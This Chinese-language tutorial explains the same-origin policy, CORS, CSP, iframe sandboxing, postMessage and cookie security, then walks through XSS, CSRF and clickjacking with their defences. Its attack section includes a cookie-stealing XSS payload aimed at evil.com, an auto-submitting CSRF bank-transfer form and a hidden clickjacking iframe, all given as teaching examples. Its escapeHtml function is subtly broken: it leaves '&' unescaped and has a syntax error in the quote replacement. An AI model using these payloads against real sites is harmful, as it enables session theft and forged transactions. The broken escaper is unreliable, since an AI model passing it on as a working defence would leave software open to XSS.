同源策略与安全

核心概念：同源策略（Same-Origin Policy, SOP）是浏览器最基本的安全策略，它限制不同源之间的资源交互，防止恶意网站窃取用户数据。CORS（跨源资源共享）是SOP的补充机制，允许服务器声明哪些外部源可以访问其资源。CSP（内容安全策略）则进一步限制页面可以加载和执行的资源来源。

一、同源策略（Same-Origin Policy）

1.1 什么是同源

两个URL的协议（protocol）、域名（host）、端口（port）都相同才被认为是同源：

URL与 http://example.com/path 比较原因
https://example.com/path不同源协议不同（http vs https）
http://www.example.com/path不同源域名不同（example.com vs www.example.com）
http://example.com:8080/path不同源端口不同（80 vs 8080）
http://example.com/other同源路径不影响同源判定
http://example.com/path?q=1同源查询参数不影响同源判定

1.2 SOP的限制范围

资源是否受SOP限制说明
AJAX / Fetch请求受限默认不能跨域发送请求
DOM操作受限iframe中不同源的DOM不可访问
Cookie / LocalStorage / IndexedDB受限只能访问同源的存储
CSS / JS / 图片 / 视频不受限可以跨域加载（但有CSP限制）
表单提交不受限可以跨域提交（但无法读取响应）
WebSocket不受限连接不受SOP限制

二、CORS（跨源资源共享）

2.1 CORS基本概念

CORS是W3C标准，允许服务器声明哪些外部源可以访问其资源。浏览器在发起跨域请求时，根据服务器返回的CORS头决定是否允许访问响应数据。

2.2 简单请求（Simple Request）

满足以下所有条件的请求是简单请求，浏览器直接发送：

  • 方法：GET、HEAD、POST
  • 头部：只包含安全的头部（Accept、Accept-Language、Content-Language、Content-Type）
  • Content-Type：仅限 text/plain、multipart/form-data、application/x-www-form-urlencoded
  • 没有使用 ReadableStream 等
// 简单请求（浏览器直接发送，不预检）
fetch('https://api.example.com/data', {
    method: 'GET',
    headers: {
        'Accept': 'application/json'
    }
});

// 服务器响应头：
// Access-Control-Allow-Origin: https://myapp.com
// Access-Control-Allow-Credentials: true

2.3 预检请求（Preflight Request）

不满足简单请求条件的请求（如PUT、DELETE方法，或自定义头部），浏览器会先发送一个 OPTIONS 预检请求：

浏览器 服务器 │ │ │ ──── OPTIONS /api/data ──────→ │ 预检请求 │ Origin: https://myapp.com │ │ Access-Control-Request-Method: PUT│ │ Access-Control-Request-Headers: │ │ Authorization, X-Custom │ │ │ │ ←── 204 No Content ──────────── │ 预检响应 │ Access-Control-Allow-Origin: * │ │ Access-Control-Allow-Methods: PUT │ │ Access-Control-Allow-Headers: │ │ Authorization, X-Custom │ │ Access-Control-Max-Age: 86400 │ │ │ │ ──── PUT /api/data ──────────→ │ 实际请求 │ Authorization: Bearer xxx │ │ X-Custom: value │ │ │ │ ←── 200 OK ──────────────────── │ 实际响应

2.4 CORS响应头详解

响应头说明示例
Access-Control-Allow-Origin允许访问的源https://myapp.com 或 *
Access-Control-Allow-Methods允许的HTTP方法GET, POST, PUT, DELETE
Access-Control-Allow-Headers允许的请求头Authorization, Content-Type
Access-Control-Allow-Credentials是否允许携带Cookietrue
Access-Control-Expose-Headers允许前端读取的响应头X-Total-Count, X-Request-Id
Access-Control-Max-Age预检结果缓存时间（秒）86400

2.5 携带Cookie的跨域请求

// 前端：需要设置 credentials: 'include'
fetch('https://api.example.com/user', {
    credentials: 'include'  // 携带Cookie
});

// 或使用 axios
axios.defaults.withCredentials = true;

// 服务器必须设置：
// Access-Control-Allow-Origin: https://myapp.com（不能用*）
// Access-Control-Allow-Credentials: true

// ⚠️ 当 Allow-Credentials 为 true 时，
// Allow-Origin 不能设为 *，必须指定具体域名
安全注意：Access-Control-Allow-Origin: * 和 Access-Control-Allow-Credentials: true 不能同时使用。这是CORS规范的安全限制，防止任意网站携带Cookie访问API。

三、CSP（内容安全策略）

3.1 什么是CSP

Content Security Policy 是一种安全机制，通过HTTP响应头或 <meta> 标签告诉浏览器哪些资源可以加载和执行，有效防御XSS攻击。

// HTTP响应头方式
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

// <meta> 标签方式
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' cdn.example.com">

3.2 CSP指令详解

指令控制对象说明
default-src所有资源的默认策略其他指令未设置时的回退值
script-srcJavaScript控制脚本来源
style-srcCSS样式表控制样式来源
img-src图片控制图片来源
font-src字体控制字体来源
connect-srcAJAX/WebSocket/SSE控制网络请求目标
media-src音频/视频控制媒体来源
frame-srciframe控制iframe来源
frame-ancestors被iframe嵌入控制哪些页面可以嵌入此页面
report-uri违规报告CSP违规时上报URL

3.3 CSP源值（Source Values）

值含义示例
'self'同源script-src 'self'
'none'不允许任何来源default-src 'none'
'unsafe-inline'允许内联脚本/样式script-src 'unsafe-inline'
'unsafe-eval'允许eval()script-src 'unsafe-eval'
'nonce-<base64>'随机数白名单script-src 'nonce-abc123'
'sha256-...'脚本哈希白名单script-src 'sha256-xxx'
域名允许指定域名script-src cdn.example.com
// 完整CSP配置示例
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-random123' https://cdn.example.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: https://*.example.com;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com wss://ws.example.com;
    frame-src 'self' https://embed.example.com;
    frame-ancestors 'self';
    base-uri 'self';
    form-action 'self';
    report-uri /csp-report;

// nonce方式使用：
<script nonce="random123">
    // 这段脚本被CSP允许执行
    console.log('CSP nonce');
</script>

3.4 CSP报告模式

// 报告模式：不阻止资源加载，只报告违规
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

// 服务器接收报告的端点示例（Express）
app.post('/csp-report', (req, res) => {
    const report = req.body['csp-report'];
    console.log('CSP违规:', {
        blockedUri: report['blocked-uri'],
        violatedDirective: report['violated-directive'],
        documentUri: report['document-uri'],
        sourceFile: report['source-file'],
        lineNumber: report['line-number']
    });
    res.status(204).end();
});
CSP部署建议：先用 Content-Security-Policy-Report-Only 上线，收集一段时间的违规报告，确认策略不会误伤正常功能后，再切换为 Content-Security-Policy 正式生效。

四、iframe安全

4.1 iframe沙箱（sandbox）

<!-- 完全沙箱化：禁止所有权限 -->
<iframe src="https://external.com" sandbox></iframe>

<!-- 选择性启用权限 -->
<iframe src="https://external.com" sandbox="
    allow-scripts        // 允许执行脚本
    allow-same-origin    // 允许访问同源资源
    allow-forms          // 允许提交表单
    allow-popups         // 允许弹出窗口
    allow-modals         // 允许打开模态框
    allow-top-navigation // 允许导航顶层页面
"></iframe>
沙箱权限说明
allow-scripts允许执行JavaScript
allow-same-origin允许将内容视为同源（可访问Cookie等）
allow-forms允许提交表单
allow-popups允许打开新窗口
allow-top-navigation允许导航顶层页面
注意：allow-scripts 和 allow-same-origin 同时使用时，iframe中的脚本可以移除sandbox属性，等于没有沙箱保护。不要同时使用这两个选项。

4.2 防止iframe嵌入

// 方法1：X-Frame-Options（旧方案，向后兼容）
X-Frame-Options: DENY           // 禁止任何网站嵌入
X-Frame-Options: SAMEORIGIN     // 只允许同源嵌入
X-Frame-Options: ALLOW-FROM https://trusted.com  // 允许指定网站

// 方法2：CSP frame-ancestors（新方案，推荐）
Content-Security-Policy: frame-ancestors 'none';     // 禁止嵌入
Content-Security-Policy: frame-ancestors 'self';     // 只允许同源
Content-Security-Policy: frame-ancestors https://trusted.com;

五、postMessage安全通信

5.1 基本用法

// 父页面（https://parent.com）
const iframe = document.getElementById('myFrame');

// 发送消息
iframe.contentWindow.postMessage(
    { type: 'GREETING', data: 'Hello from parent' },
    'https://child.com'  // 目标源（必须指定）
);

// 接收消息
window.addEventListener('message', (event) => {
    // ⚠️ 安全校验：必须验证来源
    if (event.origin !== 'https://child.com') return;

    console.log('收到消息:', event.data);
    console.log('发送者:', event.origin);
});

// iframe页面（https://child.com）
window.addEventListener('message', (event) => {
    // 验证来源
    if (event.origin !== 'https://parent.com') return;

    // 回复消息
    event.source.postMessage(
        { type: 'REPLY', data: 'Hello from child' },
        event.origin
    );
});

5.2 postMessage安全最佳实践

  • 始终指定targetOrigin：不要使用 '*'，应指定具体的接收方源
    • 始终验证event.origin：在接收消息时检查来源是否可信
  • 验证消息内容：不要盲目信任接收到的数据，进行类型和格式校验
  • 不要传递敏感数据：postMessage的消息可能被恶意中间件截获
  • 使用结构化克隆：postMessage使用结构化克隆算法，支持复杂对象
// ❌ 不安全
iframe.contentWindow.postMessage(data, '*');  // 任何页面都可能收到

// ✅ 安全
iframe.contentWindow.postMessage(data, 'https://trusted.com');

// ❌ 不安全的接收
window.addEventListener('message', (event) => {
    process(event.data);  // 不验证来源，直接处理
});

// ✅ 安全的接收
window.addEventListener('message', (event) => {
    const allowedOrigins = ['https://parent.com', 'https://partner.com'];
    if (!allowedOrigins.includes(event.origin)) return;

    // 验证消息结构
    if (typeof event.data !== 'object' || !event.data.type) return;

    process(event.data);
});

六、Cookie安全

6.1 Cookie安全属性

// 完整的安全Cookie配置
Set-Cookie: sessionId=abc123;
    Domain=.example.com;       // 作用域名
    Path=/;                    // 作用路径
    Max-Age=3600;              // 过期时间（秒）
    Secure;                    // 只在HTTPS下发送
    HttpOnly;                  // 禁止JavaScript访问
    SameSite=Strict;           // 跨站请求不发送Cookie
    Partitioned;               // CHIPS：分区Cookie（第三方场景）
属性说明防护作用
Secure只在HTTPS连接下发送Cookie防止中间人攻击截获Cookie
HttpOnlyJavaScript无法通过 document.cookie 访问防止XSS窃取Cookie
SameSite控制跨站请求是否携带Cookie防止CSRF攻击
Partitioned第三方Cookie按顶级站点分区防止跨站追踪（CHIPS）

6.2 SameSite详解

值行为适用场景
Strict跨站请求完全不携带Cookie最高安全级，如银行操作
Lax顶级导航的GET请求携带Cookie大多数场景的默认值
None所有请求都携带Cookie（需配合Secure）嵌入式场景（如第三方支付）
注意：Chrome从2024年开始逐步淘汰第三方Cookie。对于需要在跨站上下文中使用的Cookie，应使用 SameSite=None; Secure; Partitioned （CHIPS方案）。

七、常见Web攻击与防御

7.1 XSS（跨站脚本攻击）

攻击方式：在网页中注入恶意脚本，在用户浏览器中执行

// 存储型XSS示例：
// 攻击者在评论中输入：
<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// 防御措施：
// 1. 输出编码（HTML转义）
function escapeHtml(str) {
    return str
        .replace(/&/g, '&')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, ''');
}

// 2. CSP禁止内联脚本
Content-Security-Policy: script-src 'self'; // 没有'unsafe-inline'

// 3. Cookie设置HttpOnly
Set-Cookie: sid=abc; HttpOnly; // JS无法读取

// 4. 使用textContent代替innerHTML
element.textContent = userInput;  // 安全
element.innerHTML = userInput;    // 危险

7.2 CSRF（跨站请求伪造）

攻击方式：诱导用户在已登录的状态下访问恶意页面，利用用户的Cookie发起非预期请求

// 攻击页面（evil.com）：
<!-- 隐藏的表单自动提交 -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

// 防御措施：
// 1. SameSite Cookie
Set-Cookie: sid=abc; SameSite=Strict;

// 2. CSRF Token
// 服务器生成token，嵌入表单，提交时验证
<input type="hidden" name="_csrf" value="random-token">

// 3. 验证Referer/Origin头
if (req.headers.origin !== 'https://myapp.com') {
    return res.status(403).send('Forbidden');
}

// 4. 自定义请求头（XHR/Fetch自动添加的头会触发CORS预检）
fetch('/api/transfer', {
    headers: { 'X-Requested-With': 'XMLHttpRequest' }
});

7.3 点击劫持（Clickjacking）

// 攻击方式：用透明iframe覆盖在诱饵按钮上
<!-- evil.com -->
<iframe src="https://bank.com/delete-account"
    style="opacity:0; position:absolute; top:0; left:0;">
</iframe>
<button>领取奖品</button>  // 实际点击的是iframe中的删除账户按钮

// 防御措施：
// 1. X-Frame-Options
X-Frame-Options: DENY

// 2. CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none';

// 3. JavaScript防御（不适合所有场景）
if (top !== self) {
    top.location = self.location;
}

八、安全响应头总结

8.1 推荐的安全头部

// 完整的安全响应头配置
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 0  // 已废弃，现代浏览器用CSP替代
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
响应头作用
Strict-Transport-Security (HSTS)强制HTTPS，防止降级攻击
Content-Security-Policy限制资源加载来源，防XSS
X-Content-Type-Options: nosniff禁止MIME类型嗅探
Referrer-Policy控制Referer头信息泄露
Permissions-Policy控制浏览器功能（摄像头、麦克风等）
Cross-Origin-Opener-Policy隔离浏览上下文
Cross-Origin-Embedder-Policy控制跨源资源嵌入
Cross-Origin-Resource-Policy控制跨源资源加载
总结：浏览器安全体系以同源策略（SOP）为核心，通过CORS解决合法的跨域通信需求，通过CSP防御XSS攻击，通过iframe沙箱和postMessage实现安全的跨域交互，通过Cookie安全属性防御CSRF和会话劫持。实际项目中应组合使用这些机制，形成纵深防御。
